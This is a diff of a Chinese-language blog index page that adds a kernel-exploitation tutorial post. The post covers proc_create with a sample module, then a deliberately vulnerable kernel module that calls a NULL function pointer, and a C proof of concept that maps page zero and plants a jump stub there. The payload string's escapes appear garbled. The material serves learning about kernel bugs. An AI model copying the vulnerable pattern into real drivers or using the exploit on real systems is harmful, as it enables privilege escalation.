@@ -196,6 +196,280 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/12/kernel-pwn-zhi-demo-null-deference/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="n0rthwater">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="n0rthwater">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/12/kernel-pwn-zhi-demo-null-deference/" class="post-title-link" itemprop="url">kernel-pwn之demo-null-deference</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-12 18:40:10" itemprop="dateCreated datePublished" datetime="2021-05-12T18:40:10+08:00">2021-05-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-17 23:23:28" itemprop="dateModified" datetime="2021-08-17T23:23:28+08:00">2021-08-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/kernel-pwn/" itemprop="url" rel="index"><span itemprop="name">kernel-pwn</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/05/12/kernel-pwn-zhi-demo-null-deference/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/05/12/kernel-pwn-zhi-demo-null-deference/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="内核API函数proc-create"><a href="#内核API函数proc-create" class="headerlink" title="内核API函数proc_create"></a>内核API函数<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2ddd32527367">proc_create</a></h1><blockquote>
+<p>在新版内核中，proc_create函数取代了create_proc_entry</p>
+</blockquote>
+<h2 id="Proc文件系统"><a href="#Proc文件系统" class="headerlink" title="Proc文件系统"></a>Proc文件系统</h2><p>虚拟的文件系统，理解为内核对用户开放的接口，用户通过它读取、修改内核进程数据</p>
+<h3 id="创建porc-file"><a href="#创建porc-file" class="headerlink" title="创建porc file"></a>创建porc file</h3><ul>
+<li>实现file_operation结构体，主要是实现read和write接口</li>
+<li>用proc_create注册到内核</li>
+<li>然后在/proc目录下可以找到对应的文件，通过它可以实现用户进程与内核的通信<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3></li>
+<li>补充  <ul>
+<li>module_param()<br>在用户态中，可以通过main()函数的参数传递命令行参数给程序，在内核态中，则使用module_param()传递命令行参数。<br>原型:module_param(name,type,perm)<br>name：既是用户看到的参数名，又是模块内接受参数的变量；<br>type: 表示参数的类型;<br>perm: 指定了在sysfs中相应文件的访问权限;            </li>
+<li>copy_to_user/copy_from_user<br>内核空间和用户空间的内存不能直接互访，需要借助上述两个函数完成内核空间与用户空间之间数据的拷贝。<br>新版本的内核中被raw_copy_to(from)_user代替。</li>
+</ul>
+</li>
+<li>示例代码<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;linux/module.h&gt;
+#include &lt;linux/moduleparam.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/kernel.h&gt;   
+#include &lt;linux/proc_fs.h&gt;
+#include &lt;asm/uaccess.h&gt;
+#define BUFSIZE  100
+
+
+MODULE_LICENSE("Dual BSD/GPL");
+MODULE_AUTHOR("Liran B.H");
+
+static int irq=20;
+module_param(irq,int,0660);
+
+static int mode=1;
+module_param(mode,int,0660);
+
+static struct proc_dir_entry *ent;
+
+// 修改irq、mode值
+static ssize_t mywrite(struct file *file, const char  __user *ubuf, size_t count, loff_t *ppos) 
+{
+        int num,c,i,m;
+        char buf[BUFSIZE];
+        if(*ppos &gt; 0 || count &gt; BUFSIZE)
+                return -EFAULT;
+        if(raw_copy_from_user(buf, ubuf, count))
+                return -EFAULT;
+        num = sscanf(buf,"%d %d",&amp;i,&amp;m);
+        if(num != 2)
+                return -EFAULT;
+        irq = i; 
+        mode = m;
+        c = strlen(buf);
+        *ppos = c;
+        return c;
+}
+
+// 读取irq、mode值
+static ssize_t myread(struct file *file, char __user *ubuf,  size_t count, loff_t *ppos) 
+{
+        char buf[BUFSIZE];
+        int len=0;
+        if(*ppos &gt; 0 || count &lt; BUFSIZE)
+                return 0;
+        len += sprintf(buf,"irq = %d\n",irq);
+        len += sprintf(buf + len,"mode = %d\n",mode);
+        
+        if(raw_copy_to_user(ubuf,buf,len))
+                return -EFAULT;
+        *ppos = len;
+        return len;
+}
+
+// 定义file_operations数据结构
+static struct file_operations myops = 
+{
+        .owner = THIS_MODULE,
+        .read = myread,
+        .write = mywrite,
+};
+
+static int simple_init(void)
+{
+        // 注册1个名称为mydev的proc文件，权限为666
+        // 对应的file_operations为myops
+        ent=proc_create("mydev",0666,NULL,&amp;myops);
+        printk(KERN_ALERT "hello...\n");
+        return 0;
+}
+
+static void simple_cleanup(void)
+{
+        // 删除ent指向的porc文件
+        proc_remove(ent);
+        printk(KERN_WARNING "bye ...\n");
+}
+
+// 模块声明
+module_init(simple_init);       
+module_exit(simple_cleanup);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>Makefile<br>参考<a href="/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/" title="linux驱动模块编写">linux驱动模块编写</a></li>
+<li>测试<img src="/2021/05/12/kernel-pwn-zhi-demo-null-deference/proc_create%E6%B5%8B%E8%AF%95.jpg" class="">
+<ul>
+<li>user_app.c<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+ 
+void main(void)
+{
+    char buf[100];
+    int fd = open("/proc/mydev", O_RDWR);
+    read(fd, buf, 100);
+    puts(buf);
+ 
+    lseek(fd, 0 , SEEK_SET);
+    write(fd, "33 4", 5);
+    
+    lseek(fd, 0 , SEEK_SET);
+    read(fd, buf, 100);
+    puts(buf);
+}   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+gcc -static user_app.c -o user_app</li>
+<li>测试                <img src="/2021/05/12/kernel-pwn-zhi-demo-null-deference/proc_create%E6%B5%8B%E8%AF%952.png" class=""></li>
+</ul>
+</li>
+</ul>
+<h1 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;linux/module.h&gt;
+#include &lt;linux/moduleparam.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/kernel.h&gt;   
+#include &lt;linux/proc_fs.h&gt;
+#include &lt;asm/uaccess.h&gt;
+
+static struct proc_dir_entry *bug1;
+
+void (*my_funptr)(void);
+ 
+static ssize_t bug1_write(struct file *file, const char __user *ubuf,  size_t count, loff_t *ppos)
+{
+        my_funptr();
+        return count;
+}
+
+static struct file_operations bugops = 
+{
+        .owner = THIS_MODULE,
+        .write = bug1_write,
+};
+
+static int __init null_dereference_init(void)
+{
+        printk(KERN_ALERT "null_dereference driver init!n");
+        bug1=proc_create("bug1",0666,NULL,&amp;bugops);
+        return 0;
+}
+
+static void __exit null_dereference_exit(void)
+{
+        proc_remove(bug1);
+        printk(KERN_ALERT "null_dereference driver exit!n");
+}
+
+module_init(null_dereference_init);
+module_exit(null_dereference_exit);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用方式参考上文</p>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">//poc.c
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+char payload[] = "xe9xeaxbexadx0b";// jmp 0xbadbeef
+
+int main(){
+    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
+    memcpy(0, payload, sizeof(payload));
+    int fd = open("/proc/bug1", O_WRONLY);
+    write(fd, "null", 4);
+    return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>gcc</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2ddd32527367">如何使用内核API函数 proc_create?</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/panhewu9919/article/details/99441712">linux内核漏洞利用初探（2）：demo-null_dereference</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/07/kernel-pwn-zhi-huan-jing-pei-zhi/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -227,7 +501,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-12 18:47:14" itemprop="dateModified" datetime="2021-05-12T18:47:14+08:00">2021-05-12</time>
+                <time title="修改时间：2021-09-14 23:13:39" itemprop="dateModified" datetime="2021-09-14T23:13:39+08:00">2021-09-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -345,6 +619,8 @@ mount -t sys none /sys
 /bin/mount -t ramfs none /dev
 /sbin/mdev -s    # We need this to find /dev/sda later
 
+chmod +x rcS
+
 # 配置dev目录
 mkdir dev
 sudo mknod dev/ttyAMA0 c 204 64
@@ -355,7 +631,7 @@ sudo mknod dev/console c 5 1
 find . | cpio -o --format=newc &gt; ../rootfs2-1.img
 
 # 运行内核镜像
-qemu-system-x86_64 -kernel ./arch/x86/boot/bzImage -initrd ./rootfs2-1.img -append "root=/dev/ram rdinit=/sbin/init"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+qemu-system-x86_64 -kernel ./arch/x86/boot/bzImage -initrd ./rootfs2-1.img -append "root=/dev/ram rdinit=/sbin/init"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="5-测试系统调用"><a href="#5-测试系统调用" class="headerlink" title="5. 测试系统调用"></a>5. 测试系统调用</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">// test_sys_hello.c
 #define _GNU_SOURCE
@@ -740,7 +1016,7 @@ print(''.join([chr(i) for i in res[::-1]]))<span aria-hidden="true" class="line-
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
